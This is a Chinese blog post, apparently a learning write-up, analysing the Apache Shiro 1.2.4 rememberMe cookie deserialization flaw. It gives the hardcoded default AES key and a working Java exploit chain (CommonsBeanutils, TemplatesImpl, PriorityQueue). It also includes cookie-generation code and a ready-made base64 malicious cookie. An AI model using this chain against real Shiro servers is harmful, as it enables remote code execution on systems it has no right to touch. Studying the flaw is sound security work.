@@ -1,0 +1,369 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Shiro反序列化 | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="Shiro反序列化环境搭建直接从github上clone代码到本地。
+123git clone https://github.com/apache/shiro.gitcd shirogit checkout shiro-root-1.2.4
+
+编辑shiro&amp;#x2F;samples&amp;#x2F;we">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Shiro反序列化"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												Shiro反序列化
+									
+									
+								</h1>
+								
+									<p id="/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="leancloud-visitors view"
+										data-flag-title="Shiro反序列化">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Shiro反序列化"><a href="#Shiro反序列化" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接从github上clone代码到本地。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git</span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>
+
+<p>编辑shiro&#x2F;samples&#x2F;web目录下的pom.xml,将jstl的版本修改为1.2。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在IDEA（注意得是ultimate）中导入mvn项目, 并配置tomcat环境<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Shiro-550-1/1.png" alt="img"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据漏洞描述，Shiro≤1.2.4版本默认使用CookieRememberMeManager，当获取用户请求时，大致的关键处理过程如下：<br><strong>·</strong> 获取Cookie中rememberMe的值<br><strong>·</strong> 对rememberMe进行Base64解码<br><strong>·</strong> 使用AES进行解密<br><strong>·</strong> 对解密的值进行反序列化</p>
+<p>由于AES加密的Key是硬编码的默认Key，因此攻击者可通过使用默认的Key对恶意构造的序列化数据进行加密，当CookieRememberMeManager对恶意的rememberMe进行以上过程处理时，最终会对恶意数据进行反序列化，从而导致反序列化漏洞。</p>
+<p><strong>以下流程可以的话一定自己动调  会更加清晰容易理解</strong></p>
+<h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>先分析一下加密的过程。<br>在org&#x2F;apache&#x2F;shiro&#x2F;mgt&#x2F;DefaultSecurityManager.java代码的rememberMeSuccessfulLogin方法下断点。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png?raw=true" alt="img"></p>
+<p>跟进onSuccessfulLogin方法，具体实现代码在AbstractRememberMeManager.java。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> &#123;</span><br><span class="line">        <span class="comment">//always clear any previous identity:</span></span><br><span class="line">        forgetIdentity(subject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//now save the new identity:</span></span><br><span class="line">        <span class="keyword">if</span> (isRememberMe(token)) &#123;</span><br><span class="line">            rememberIdentity(subject, token, info);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用forgetIdentity方法对subject进行处理，subject对象表示单个用户的状态和安全操作，包含认证、授权等（ <code>http://shiro.apache.org/static/1.6.0/apidocs/org/apache/shiro/subject/Subject.html</code>）。继续跟进forgetIdentity方法，getCookie方法获取请求的cookie，接着会进入到removeFrom方法。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png?raw=true" alt="img"></p>
+<p>removeForm主要在response头部添加Set-Cookie: rememberMe&#x3D;deleteMe<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png?raw=true" alt="img"></p>
+<p>然后再回到onSuccessfulLogin方法中，如果设置rememberMe则进入rememberIdentity。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png?raw=true" alt="img"></p>
+<p>rememberIdentity方法代码中，调用convertPrincipalsToBytes对用户名进行处理。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">        rememberSerializedIdentity(subject, bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入convertPrincipalsToBytes，调用serialize对用户名进行处理。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(principals);</span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">            bytes = encrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进serialize方法来到org&#x2F;apache&#x2F;shiro&#x2F;io&#x2F;DefaultSerializer.java，很明显这里对用户名进行了序列化。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png?raw=true" alt="img"></p>
+<p>再回到convertPrincipalsToBytes，接着对序列化的数据进行加密，跟进encrypt方法。加密算法为AES，模式为CBC，填充算法为PKCS5Padding。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png?raw=true" alt="img"></p>
+<p>getEncryptionCipherKey获取加密的密钥，在AbstractRememberMeManager.java定义了默认的加密密钥为kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png?raw=true" alt="img"></p>
+<p>加密完成后，继续回到rememberIdentity，跟进rememberSerializedIdentity方法。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png?raw=true" alt="img"></p>
+<p>对加密的bytes进行base64编码，保存在cookie中。至此，加密的流程基本就分析完了。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png?raw=true" alt="img"></p>
+<h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>对cookie中rememberMe的解密代码也是在AbstractRememberMeManager.java中实现。直接在getRememberedPrincipals下断点。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png?raw=true" alt="img"></p>
+<p>getRememberedSerializedIdentity返回cookie中rememberMe的base64解码后的bytes。<br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png?raw=true" alt="img"></p>
+<p>继续调用convertBytesToPrincipals方法对解码后的bytes处理，跟进convertBytesToPrincipals方法，调用decrypt方法对bytes进行解密。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123;</span><br><span class="line">        if (getCipherService() != null) &#123;</span><br><span class="line">            bytes = decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        return deserialize(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>解密后得到的结果为序列化字符串的bytes。</p>
+<p>然后进入到deserialize方法进行反序列化，即用户可控的rememberMe值经过解密后进行反序列化从而引发反序列化漏洞。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果想通过反序列化实现RCE  最好在shiro本身依赖当中寻找利用链  </p>
+<p>这里利用到commons-beanutils  中的 <code>PropertyUtils.getProperty</code>  它可以对一个对象调用对应的get方法来获取成员变量的值  测试代码如下 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CBTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">18</span>, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(p, <span class="string">&quot;age&quot;</span>));	<span class="comment">// 18</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">        Person(<span class="type">int</span> a, String n) &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = a;</span><br><span class="line">            <span class="built_in">this</span>.name = n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>跟进getProperty的逻辑发现它相当于就是拼接<code>get</code>和首字母大写后的成员变量 后得到函数名，搜索调用</p>
+<h3 id="0z1"><a href="#0z1" class="headerlink" title="0z1"></a>0z1</h3><p>刚好TemplatesImpl 中有get方法并且会执行<strong>newTransformer()</strong> （作用可以看<a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/12/13/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC3/">JAVA反序列化CC3</a>）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以构造类似<code>PropertyUtils.getProperty(templates, &quot;outputProperties&quot;)</code>来触发执行</p>
+<h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><p>接着追踪调用了getProperty的地方  有三处 但只有<code>BeanComparator</code>可以序列化  所以跟进</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( Object o1, Object o2 )</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">            <span class="keyword">return</span> comparator.compare( o1, o2 );</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">            <span class="keyword">return</span> comparator.compare( value1, value2 );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参数均可控</p>
+<h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h3><p>BeanComparator 也是一种Comparator  用于比较类对象间大小   PriorityQueue在反序列化时如果有comparator会自动调用它的compare方法</p>
+<p>构造（注意序列化的时候不能有数组类，否则反序列化时会报错  因此ChainedTransformer不再可用  具体可见 <a target="_blank" rel="noopener" href="https://changxia3.com/2020/10/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%89%EF%BC%88%E8%A7%A3%E7%96%91%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记三（解疑篇）</a>）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecode</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecode.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1</span>][];</span><br><span class="line">        bytes[<span class="number">0</span>] = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\path\\to\\target\\classes\\Test.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        bytecode.set(templates, bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;gg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformerFactoryImpl</span> <span class="variable">tfi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, tfi);</span><br><span class="line">		<span class="comment">/*************************</span></span><br><span class="line"><span class="comment">		这里使用new AttrCompare()的原因：</span></span><br><span class="line"><span class="comment">		BeanComparator构造方法如果不指定comparator会使用CC里面的ComparableComparator  有可能找不到报错</span></span><br><span class="line"><span class="comment">		AttrCompare也是一种Comparator  并且public, serializable</span></span><br><span class="line"><span class="comment">		************************/</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">bc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>, <span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line">		</span><br><span class="line">    	<span class="comment">/***********************</span></span><br><span class="line"><span class="comment">    	 这里先不放BeanComparator  因为add过程中会调用 可能会报错</span></span><br><span class="line"><span class="comment">    	 同理add时先不add templates  </span></span><br><span class="line"><span class="comment">    	 最后序列化之前设置好各个成员变量为目标变量 （反序列化时操作的是目标变量即可）</span></span><br><span class="line"><span class="comment">    	 ***************************/</span></span><br><span class="line">        PriorityQueue&lt;Object&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">        <span class="type">Field</span> <span class="variable">cprtField</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        cprtField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cprtField.set(pq, bc);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">queueArray</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queueArray.set(pq, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"><span class="comment">//        serialize(pq);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;bin&quot;);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h3><p>由序列化后的文件生成cookie  并发送触发反序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">generate</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(filename));</span><br><span class="line"></span><br><span class="line">        <span class="type">AbstractRememberMeManager</span> <span class="variable">arm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CookieRememberMeManager</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> AbstractRememberMeManager.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">encryptMethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;encrypt&quot;</span>, <span class="type">byte</span>[].class);</span><br><span class="line">        encryptMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] encrypted = (<span class="type">byte</span>[]) encryptMethod.invoke(arm, bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cookie</span> <span class="operator">=</span> Base64.encodeToString(encrypted);</span><br><span class="line">        System.out.println(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// iYaEQ6iThGKKETDKvrBK71hkIPthnaicJuSeh/uyWHkwS9PsbWfNgr1csVHHKgWJlX+FCGIEs+hrcNTwJu/Qzr1tES5iNkb73nZ9e7n4UaKfc/WVXNxX2rBsbvivXedjjrX90gQ6Q5tAzu01FGdrzLM4UO7Dh3ZSWIOW+jimfBne5irMhPx4Pi8pTiSgZOsBEg9cyTJGisOFNPEWtDIPenYyIaOgO5wIpTIy6H/qkkhCDSK55YhqUvOms8H5t2fAq+K5n4VYKrsZxdtViHJjaP4Sn7O0mNR7QBPtqQsNazD85cHcbTC+aO6lfJueZnFloh0lUcK4/BeyBfAroAZ4z+7rVGLetN3yDE55fdSx3clcjW8uK05tekuItiX+eeSu4JHWNHePAI0sTS9MqLGwNLe3OQ9sDWnpul4w1G2Kfca1es5Idn5DWSbWwMuGf5XRr39wLiRKO+iita03+6L4DicgR45t6dRbvrVBh/l8Iq/1R4tJ1i7+5jLnNtoCUM3lCUXDMfed31q5fMe/C7djO4Mw+5MpRY+mhgE9cDoqt8yPBFPCWLudzVJigggPqr1BL2PA8J9UEjVbwEuKtvx1N4SfSf6tAzTRMUsal9taSVCpYSlBbGyqfBNMEGhEQu7uyGX0cm+0p4qEGz5YVzqpR2KfX8FwAfW3D+ioF/nYzJADY453AtB1ljcGjHjd92s+aviV8q6e6iPaD0aYPwuUUqD61NQQHgzfsjdkcgz7d7vmhQ+trdkt1id+hbzEXvkYZZuDBi/KMF/HjxEHfCSSiAMaZnzNIswQMXSHKXCdOt0MLR+k2r/5S892Z8sfe1+t+dDoCVGyKxKx4vYALo5+mh6AIEirITbxIcW3+lDvHNs/tvqf3/YvCn2yWsYSY5wL/SIe375ePPuA5uweCe25IXttahpOZw/14/pF7mbsraWRLe/Tr81mZ1150Sxf95mFl2E9URvohKLTzGWb4ton6v61zUjkebQR5UZm1cUMjaYG82SlHpoNe4VF+q8cWkxBQLDdSSNchhOkhSH9/8O7gjas4T1vDtD0e4WRJFCo6t+6LPKMyZ6l8/olomHXLUA5AlsXBMtWmGn5yxlQog+oPsjvX4DvjLzJmHYqO30wAdH3Y1n+Yi2S/Ql5Ktwbyy6iazhlD6yMtajhaxroUGQG8JtJZCs4EBLIAwvBuiDpCnyN3vpHA3NB2zfra0Nb7CQFUxgS7zWGpB47PCgBVk49N5FyIkjZt8EWinbNG71rQAaTR3/fYwHaIegFvder+TxwvfPIz4aoyJQVZdcEI30FUDsYIleF+DKhAiWN0SAAy4Q8va2fzB7tuqq34llMe+rbSX+1luznzB2rwovcI1jUEMMrRWNmfq